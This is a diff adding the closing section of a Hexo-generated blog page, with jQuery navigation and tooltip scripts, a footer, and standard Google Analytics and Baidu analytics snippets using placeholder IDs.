+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 li9hu
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
